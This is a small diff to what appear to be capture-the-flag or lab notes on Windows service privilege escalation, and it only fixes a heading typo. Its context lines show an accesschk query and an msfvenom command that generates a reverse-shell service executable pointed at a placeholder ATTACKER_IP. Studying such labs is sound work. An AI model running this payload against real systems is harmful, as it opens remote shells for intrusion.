@@ -35,7 +35,7 @@ C:\tools\AccessChk> accesschk64.exe -qlc thmservice
 
 <br/>
 
-- Generating and Transfering the **PAYLOAD**
+- Generating and Transferring the **PAYLOAD**
 
 ```js
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
